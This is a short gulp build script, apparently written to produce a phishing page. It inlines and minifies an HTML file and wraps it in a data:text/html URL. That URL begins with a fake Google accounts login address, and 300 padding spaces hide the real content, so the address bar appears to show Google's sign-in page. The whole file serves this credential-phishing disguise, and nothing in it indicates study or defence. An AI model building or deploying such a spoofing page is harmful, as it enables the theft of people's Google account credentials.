var gulp = require('gulp'),
  inline = require('gulp-inline-source'),
  htmlmin = require('gulp-htmlmin'),
  change = require('gulp-change');


function toDataURL(content) {
  var fakeURL = "https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/#identifier";
  for(var i = 0; i < 300; i++){
    fakeURL += " ";
  }

  content = "data:text/html," + fakeURL + content;

  console.log(content);
  return content;
}

gulp.task('default', function(){
  return gulp.src('./source/index.html')
    .pipe(inline())
    .pipe(htmlmin({collapseWhitespace: true}))
    .pipe(change(toDataURL))
    .pipe(gulp.dest('./public'));
});
